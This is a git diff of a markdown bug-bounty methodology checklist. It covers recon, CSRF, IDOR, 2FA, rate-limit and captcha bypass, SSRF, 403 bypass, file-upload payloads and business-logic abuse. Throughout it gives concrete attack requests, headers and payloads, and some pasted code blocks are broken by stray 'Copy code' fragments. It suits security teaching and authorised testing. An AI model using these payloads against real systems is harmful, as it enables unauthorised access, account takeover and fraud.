@@ -1,12 +1,12 @@
 # Methodology v1.0
 
-**econnaissance**
+## R**econnaissance**
 
 **Active recon ⇒ Port scan/valu scan/web scan/nmap/masscan**
 
 **Passive recon ⇒ whios/whatweb/osint/DNS/>Dorks**
 
-## **I am seeking to obtain the following:**
+#### **I am seeking to obtain the following:**
 
 **My principle is from start to finish ..**
 
@@ -22,7 +22,7 @@
 >
 > **6-Emails**
 
-
+<figure><img src="../.gitbook/assets/image (1).png" alt=""><figcaption><p>Recon Guide for Pentesters</p></figcaption></figure>
 
 ### **JSfinder to find a JS files**
 
@@ -136,7 +136,7 @@ nuclei -l http_domains.txt -t nuclei-templates/
 <pre class="language-bash"><code class="lang-bash"><strong>fuff -u https://exmple.com/FUZZ -w Onelistforall/onelistforallshort.txt -mc 200,403
 </strong></code></pre>
 
-> **Bypassing CSRF Protect**
+### **Bypassing CSRF Protect**
 
 * [ ] Remove the entire token parameter with Value/Remove just the value.
 * [ ] Use any other random but sam length token
@@ -156,6 +156,7 @@ HOST: example.com
 * [ ] if token is ent through custom header; try to remove the header.
 * [ ] Change the Content-Type to application/json, application/x-url-encoded or from-mutipart, text/xml, application/xml.
 * [ ] if double submit token is there (in cookie and some header then try [**CRLF injection.**](https://book.hacktricks.xyz/pentesting-web/crlf-0d-0a#crlf)
+* [ ] [https://github.com/daffainfo/AllAboutBugBounty/blob/master/CRLF%20Injection.md](https://github.com/daffainfo/AllAboutBugBounty/blob/master/CRLF%20Injection.md)
 *   [ ] Bypass referrer check:
 
     I if the referrer header is checked buy only when it exists in the request then add piece of code in your csrf POC: **\<meta name="referrer" content="never">**
@@ -186,7 +187,7 @@ https://attacker.com/.target.com
 * [ ] Generate multiple CSRF token, observe the static part, Keep it as it is and play with thr dyamic part
 * [ ] Remove X-CSRF-TOKEN from Header
 
-> **IDOR**
+### **IDOR**
 
 * [ ] Find and Replace **`IDs` in URLs, header and body: /users/01 -> /users/02**
 * [ ] **Try** Parameter Pollution: **`users=01` -> `users=01&users=02`**
@@ -213,24 +214,58 @@ https://attacker.com/.target.com
     Bild IDORsL Sometimes information is not directly discloed, Lookout for endpoint and features that may disclose information such as export  files, emails or message alerts.
 * [ ] Chain IDOR with XSS for Account Tackeovers
 
-> 2FA Bypass Techniques
+### 2FA Bypass Techniques
 
-* [ ] \
-  **OTP BYPASS**
-  * Response Manipulation: if **`"success":false`** change to **`"success":true`**
-  * **`Status Code` Manipulation: if status is 4xx change to 200 ok**&#x20;
-  * By repeating the form submission multiple times using a repeater
-  * js file: Rare but some js files may contain some information about 2FA code
-  * Brute Forcing any length MFA Code
-  * \[\[JSON Tests Cheat Sheet]] -> Array of codes.....
-  * Check for default OTP - **`111111, 123456, 000000,4242 or null`**
-  * leaked in response
-  * CSRF on 2fa Disabling&#x20;
-  * Password reset Disable 2fa Email/Password
-  * old OTP is still valid
-  * Integrity Issues -> Use someone else OTP to open your account
+*   [ ] \
+    **OTP BYPASS**
 
-> **Bypassing Rate Limit Protection**
+    * Response Manipulation: if **`"success":false`** change to **`"success":true`**
+    * **`Status Code` Manipulation: if status is 4xx change to 200 ok**&#x20;
+    * By repeating the form submission multiple times using a repeater
+    * js file: Rare but some js files may contain some information about 2FA code
+    * Brute Forcing any length MFA Code
+    * \[\[JSON Tests Cheat Sheet]] -> Array of codes.....
+    * Check for default OTP - **`111111, 123456, 000000,4242 or null`**
+    * leaked in response
+    * CSRF on 2fa Disabling&#x20;
+    * Password reset Disable 2fa Email/Password
+    * old OTP is still valid
+    * Integrity Issues -> Use someone else OTP to open your account
+
+    ```
+    POST /2fa/
+    Host: vuln.com
+    ...
+    email=attacker@gmail.com&code=382923
+    ```
+
+    ```
+    POST /2fa/
+    Host: vuln.com
+    ...
+    email=victim@gmail.com&code=382923
+    ```
+
+
+
+    Always check the response!
+
+    ```
+    POST /req-2fa/
+    Host: vuln.com
+    ...
+    email=victim@gmail.com
+    ```
+
+    The response is
+
+    ```
+    HTTP/1.1 200 OK
+    ...
+    {"email": "victim@gmail.com", "code": "101010"}
+    ```
+
+### **Bypassing Rate Limit Protection**
 
 ```
 X-Originating-IP: 127.0.0.1
@@ -272,7 +307,7 @@ email=victim@gmail.com&alsofake=2
 * [ ] [https://bugcrowd.com/disclosures/55b40919-2c02-402c-a2cc-7184349926d7/login-capctha-bypass](https://bugcrowd.com/disclosures/55b40919-2c02-402c-a2cc-7184349926d7/login-capctha-bypass)
 * [ ] change api version (EX: api/v2/1729/confirm-email to api/v1/1729/confirm-email )
 
-> **File Upload**
+### **File Upload**
 
 Reference:https://brutelogic.com.br/blog/file-upload-xss/
 
@@ -314,3 +349,284 @@ SQLi Via File upload	               ---	Try uploading `sleep(10)-- -.jpg` as fil
 * [SQL Injection - File name](https://shahjerry33.medium.com/sql-injection-the-file-upload-playground-6580b089d013)
 * [XXE ON JPEG](https://hackerone.com/reports/836877)
 * [Create A picture that steals Data](https://medium.com/@iframe\_h1/a-picture-that-steals-data-ff604ba101)
+
+### **SSRF**
+
+Here are 5 payloads that could be used for bypassing defenses when it comes to SSRF (Server-Side Request Forgery):
+
+1.  **Bypass SSRF with CIDR:**
+
+    ```arduino
+    arduinoCopy codehttp://127.127.127.127
+    http://127.0.0.0
+    ```
+2.  **Bypass using rare address:**
+
+    ```arduino
+    arduinoCopy codehttp://127.1
+    http://0
+    ```
+3.  **Bypass using tricks combination:**
+
+    ```perl
+    perlCopy codehttp://1.1.1.1&@2.2.2.2@3.3.3.3/
+    urllib: 3.3.3.3
+    ```
+4.  **Bypass against a weak parser:**
+
+    ```perl
+    perlCopy codehttp://127.1.1.1:80@127.2.2.2:80/
+    ```
+5.  **Bypass localhost with @:**
+
+    ```arduino
+    arduinoCopy codehttp://[::1]:80/
+    http://0000::1:80/
+    ```
+
+***
+
+Let’s remind ourselves what SSRF vulnerabilities are and what can we do with them. In general, SSRF allows us to:
+
+* Access services on the loopback interface running on the remote server
+* Scan internal network and potentially interact with the discovered services
+* Read local files on the server using file:// protocol handler
+* Move laterally / pivoting into the internal environment
+
+**How to find SSRF?** When the target web application allows us to access external resources, e.g., a profile image loaded from external URL (running on a 3rd party website), we can try to load internal resources accessible by the vulnerable web application. For example:
+
+1.  We discover that the following URL works:
+
+    ```bash
+    bashCopy codehttps://example.com:8000/page?user=&link=https://127.0.0.1:8000
+    ```
+2. We can then run Intruder attack (Burp Suite) trying different ports, effectively doing a port scan of the host.
+3. We can also try to scan private IPs such as 192.168.x.x and discover alive IPs in the internal network
+
+
+
+### Dangerous Functions
+
+| Language       | Function                                                                                                                      | Possible Vulnerability                                                                                                                                                                                                                                                                                                      |
+| -------------- | ----------------------------------------------------------------------------------------------------------------------------- | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
+| **PHP**        | `eval()`, `assert()`, `system()`, `exec()`, `shell_exec()`, `passthru()`, `popen()`, backticks (\`), `include()`, `require()` | RCE if used on unsanitized user input. `eval()` and `assert()` execute PHP code in its input, while `system()`, `exec()`, `shell_exec()`, `passthru()`, `popen()`, and backticks execute system commands. `include()` and `require()` can be used to execute PHP code by feeding the function a URL to a remote PHP script. |
+| **PHP**        | `unserialize()`                                                                                                               | Insecure deserialization if used on unsanitized user input                                                                                                                                                                                                                                                                  |
+| **Python**     | `eval()`, `exec()`, `os.system()`                                                                                             | RCE if used on unsanitized user input                                                                                                                                                                                                                                                                                       |
+| **Python**     | `pickle.loads()`, `yaml.load()`                                                                                               | Insecure deserialization if used on unsanitized user input                                                                                                                                                                                                                                                                  |
+| **JavaScript** | `document.write()`, `document.writeln`                                                                                        | XSS if used on unsanitized user input. These functions write to the HTML document. So if attackers can control the value passed into it on a victim's page, the attacker can write JavaScript onto a victim's page.                                                                                                         |
+| **JavaScript** | `document.location.href`                                                                                                      | Open redirect when used on unsanitized user input. `document.location.href` changes the location of the user's page.                                                                                                                                                                                                        |
+| **Ruby**       | `System()`, `exec()`, `%x()`, backticks (\`code\`)                                                                            | RCE if used on unsanitized user input                                                                                                                                                                                                                                                                                       |
+| **Ruby**       | `Marshal.load()`, `yaml.load()`                                                                                               | Insecure deserialization if used on unsanitized user input                                                                                                                                                                                                                                                                  |
+
+### Bypass 403 (Forbidden)
+
+[Bypass-403 | Go script for bypassing 403 forbidden](https://github.com/daffainfo/bypass-403)
+
+1. Using "X-Original-URL" header
+
+```
+GET /admin HTTP/1.1
+Host: target.com
+```
+
+Try this to bypass
+
+```
+GET /anything HTTP/1.1
+Host: target.com
+X-Original-URL: /admin
+```
+
+2. Appending **%2e** after the first slash
+
+```
+http://target.com/admin => 403
+```
+
+Try this to bypass
+
+```
+http://target.com/%2e/admin => 200
+```
+
+3. Try add dot (.) slash (/) and semicolon (;) in the URL
+
+```
+http://target.com/admin => 403
+```
+
+Try this to bypass
+
+```
+http://target.com/secret/. => 200
+http://target.com//secret// => 200
+http://target.com/./secret/.. => 200
+http://target.com/;/secret => 200
+http://target.com/.;/secret => 200
+http://target.com//;//secret => 200
+```
+
+4. Add "..;/" after the directory name
+
+```
+http://target.com/admin
+```
+
+Try this to bypass
+
+```
+http://target.com/admin..;/
+```
+
+5. Try to uppercase the alphabet in the url
+
+```
+http://target.com/admin
+```
+
+Try this to bypass
+
+```
+http://target.com/aDmIN
+```
+
+6. Via Web Cache Poisoning
+
+```
+GET /anything HTTP/1.1
+Host: victim.com
+X­-Original-­URL: /admin
+```
+
+### Bypass Captcha&#x20;
+
+1. Try changing the request method, for example POST to GET
+
+```
+POST / HTTP 1.1
+Host: target.com
+...
+
+_RequestVerificationToken=xxxxxxxxxxxxxx&_Username=daffa&_Password=test123
+```
+
+Change the method to GET
+
+```
+GET /?_RequestVerificationToken=xxxxxxxxxxxxxx&_Username=daffa&_Password=test123 HTTP 1.1
+Host: target.com
+...
+```
+
+2. Try remove the value of the captcha parameter
+
+```
+POST / HTTP 1.1
+Host: target.com
+...
+
+_RequestVerificationToken=&_Username=daffa&_Password=test123
+```
+
+3. Try reuse old captcha token
+
+```
+POST / HTTP 1.1
+Host: target.com
+...
+
+_RequestVerificationToken=OLD_CAPTCHA_TOKEN&_Username=daffa&_Password=test123
+```
+
+4. Convert JSON data to normal request parameter
+
+```
+POST / HTTP 1.1
+Host: target.com
+...
+
+{"_RequestVerificationToken":"xxxxxxxxxxxxxx","_Username":"daffa","_Password":"test123"}
+```
+
+Convert to normal request
+
+```
+POST / HTTP 1.1
+Host: target.com
+...
+
+_RequestVerificationToken=xxxxxxxxxxxxxx&_Username=daffa&_Password=test123
+```
+
+5. Try custom header to bypass captcha
+
+```
+X-Originating-IP: 127.0.0.1
+X-Forwarded-For: 127.0.0.1
+X-Remote-IP: 127.0.0.1
+X-Remote-Addr: 127.0.0.1
+```
+
+6. Change some specific characters of the captcha parameter and see if it is possible to bypass the restriction.
+
+```
+POST / HTTP 1.1
+Host: target.com
+...
+
+_RequestVerificationToken=xxxxxxxxxxxxxx&_Username=daffa&_Password=test123
+```
+
+Try this to bypass
+
+```
+POST / HTTP 1.1
+Host: target.com
+...
+
+_RequestVerificationToken=xxxdxxxaxxcxxx&_Username=daffa&_Password=test123
+```
+
+### Business Logic Errors
+
+1. Review Functionality
+   * Some applications have an option where verified reviews are marked with some tick or it's mentioned. Try to see if you can post a review as a Verified Reviewer without purchasing that product.
+   * Some app provides you with an option to provide a rating on a scale of 1 to 5, try to go beyond/below the scale-like provide 0 or 6 or -ve.
+   * Try to see if the same user can post multiple ratings for a product. This is an interesting endpoint to check for Race Conditions.
+   * Try to see if the file upload field is allowing any exts, it's often observed that the devs miss out on implementing protections on such endpoints.
+   * Try to post reviews like some other users.
+   * Try performing CSRF on this functionality, often is not protected by tokens
+2. Coupon Code Functionality
+   * Apply the same code more than once to see if the coupon code is reusable.
+   * If the coupon code is uniquely usable, try testing for Race Condition on this function by using the same code for two accounts at a parallel time.
+   * Try Mass Assignment or HTTP Parameter Pollution to see if you can add multiple coupon codes while the application only accepts one code from the Client Side.
+   * Try performing attacks that are caused by missing input sanitization such as XSS, SQLi, etc. on this field
+   * Try adding discount codes on the products which are not covered under discounted items by tampering with the request on the server-side.
+3. Delivery Charges Abuse
+   * Try tampering with the delivery charge rates to -ve values to see if the final amount can be reduced.
+   * Try checking for the free delivery by tampering with the params.
+4. Currency Arbitrage
+   * Pay in 1 currency say USD and try to get a refund in EUR. Due to the diff in conversion rates, it might be possible to gain more amount.
+5. Premium Feature Abuse
+   * Try forcefully browsing the areas or some particular endpoints which come under premium accounts.
+   * Pay for a premium feature and cancel your subscription. If you get a refund but the feature is still usable, it's a monetary impact issue.
+   * Some applications use true-false request/response values to validate if a user is having access to premium features or not.
+   * Try using Burp's Match & Replace to see if you can replace these values whenever you browse the app & access the premium features.
+   * Always check cookies or local storage to see if any variable is checking if the user should have access to premium features or not.
+6. Refund Feature Abuse
+   * Purchase a product (usually some subscription) and ask for a refund to see if the feature is still accessible.
+   * Try for currency arbitrage explained yesterday.
+   * Try making multiple requests for subscription cancellation (race conditions) to see if you can get multiple refunds.
+7. Cart/Wishlist Abuse
+   * Add a product in negative quantity with other products in positive quantity to balance the amount.
+   * Add a product in more than the available quantity.
+   * Try to see when you add a product to your wishlist and move it to a cart if it is possible to move it to some other user's cart or delete it from there.
+8. Thread Comment Functionality
+   * Unlimited Comments on a thread
+   * Suppose a user can comment only once, try race conditions here to see if multiple comments are possible.
+   * Suppose there is an option: comment by the verified user (or some privileged user) try to tamper with various parameters in order to see if you can do this activity.
+   * Try posting comments impersonating some other users.
+9. Parameter Tampering
+   * Tamper Payment or Critical Fields to manipulate their values
+   * Add multiple fields or unexpected fields by abusing HTTP Parameter Pollution & Mass Assignment
+   * Response Manipulation to bypass certain restrictions such as 2FA Bypass
